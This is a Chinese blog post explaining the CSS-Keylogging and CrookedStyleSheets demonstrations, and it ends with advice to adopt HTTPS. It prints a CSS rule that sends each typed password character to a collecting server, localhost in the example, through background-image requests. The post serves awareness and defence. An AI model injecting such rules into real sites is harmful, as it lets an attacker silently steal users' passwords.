---
title: 使用 css 获取用户密码
subtitle: 使用 css 去捕获用户密码，最容易忽视的往往是最容易出现问题的，安全问题不容小觑。
date: 2018-02-23
cover: https://blog.static.minfive.com/post/18-02-23/112054010556572.png
categories: 日常学习
tags:
    - css
    - 安全

author:
  nick: minfive
  link: 'https://github.com/Mrminfive'
---

### 前言

新年工作第一天，在 github 上闲逛，发现了一个很有趣的项目，叫 [CSS-Keylogging][CSS-Keylogging]，这是一个演示如何用 css 去获取用户输入的密码的项目，这个项目与一两个月前的另外一个很火的项目 [CrookedStyleSheets][CrookedStyleSheets] 类似，甚至于有可能 [CSS-Keylogging][CSS-Keylogging] 就是受 [CrookedStyleSheets][CrookedStyleSheets] 启发才创建的。

### 不一样的 css

说到 css，大多数人的第一印象基本上就是用来配置界面样式的，甚至于连语言都称不上，但随着 web 技术的不停发展，其所具有的能力也与日俱新，不再是当初那个仅仅满足最基本布局需求的层叠样式表了，至于新的属性新的功能点笔者也了解不全，在这里也不便展开了。

话题回到不一样的 css 上，github 上 [jbtronics][jbtronics] 给出了这样一份答案 [CrookedStyleSheets][CrookedStyleSheets]，在这里笔者直接给上该项目的[中文文档][CrookedStyleSheetsDoc]，该文档上有一段关于输入监测的段落，请详细阅读完，如果早已看过请跳过继续看本文的后续部分。

### css 监听键盘记录

[CSS-Keylogging][CSS-Keylogging] 项目使用 css 监听键盘记录的方式一致，基本上是通过 css 选择器去实现功能，[CSS-Keylogging][CSS-Keylogging] 更为巧妙的使用多重选择器去捕获相应的按键事件。

核心代码如下:

``` css
input[type="password"][value$="1"] { background-image: url("http://localhost:3000/1"); }
```

解释如下：

当 type 为 'password' 的输入框的输入的最后一个字符为 '1' 时使用 url 为 `http://localhost:3000/1` 的背景图，css 在这种情况下会尝试进行 get 请求获取资源，这样的话，服务端就能接收到来至客户端发送的 get 请求。

当 `value$="1"` 时，我们可以监听用户输入 `1`，那如果我们监听键盘上所有的按键字符，那我们是不是就可以监听用户的所有按键输入了？答案是可以，该项目使用 go 脚本遍历 ascii 码表，将所有键盘可输入按键字符均进行捕获，生成如下样式表：

![code][code]

当然也可以用使用 nodejs 去生成样式表，至今不明白作者为什么用 node 搭服务器然后用 go 写脚本。。。有兴趣的同学可以将项目 clone 下来跑起来试试。

### 总结

为了避免有目的性的劫持注入，请尽快升级 https ，预防这种情况的发生，网络安全无处不在，希望不要选择性的去忽视它。


[CSS-Keylogging]: https://github.com/maxchehab/CSS-Keylogging
[CrookedStyleSheets]: https://github.com/jbtronics/CrookedStyleSheets
[jbtronics]: https://github.com/jbtronics
[CrookedStyleSheetsDoc]: https://github.com/jbtronics/CrookedStyleSheets/blob/master/docs/README.zh.md
[code]: https://blog.static.minfive.com/post/18-02-23/code.png
